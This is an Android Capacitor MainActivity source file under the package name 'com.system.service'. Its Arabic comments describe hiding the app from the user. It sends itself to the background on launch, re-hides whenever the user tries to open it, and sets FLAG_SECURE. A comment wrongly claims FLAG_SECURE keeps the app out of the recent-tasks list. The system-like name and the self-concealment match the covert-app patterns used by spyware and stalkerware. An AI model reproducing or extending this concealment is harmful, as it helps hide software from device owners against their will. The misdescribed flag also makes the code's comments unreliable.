package com.system.service;

import android.os.Bundle;
import android.view.WindowManager;
import com.getcapacitor.BridgeActivity;

public class MainActivity extends BridgeActivity {
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // إخفاء النشاط فوراً (يشتغل في الخلفية)
        moveTaskToBack(true);

        // منع ظهور النشاط في قائمة المهام الحديثة
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
            getWindow().addFlags(WindowManager.LayoutParams.FLAG_SECURE);
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        // إعادة إخفاء النشاط إذا حاول المستخدم فتحه
        moveTaskToBack(true);
    }
}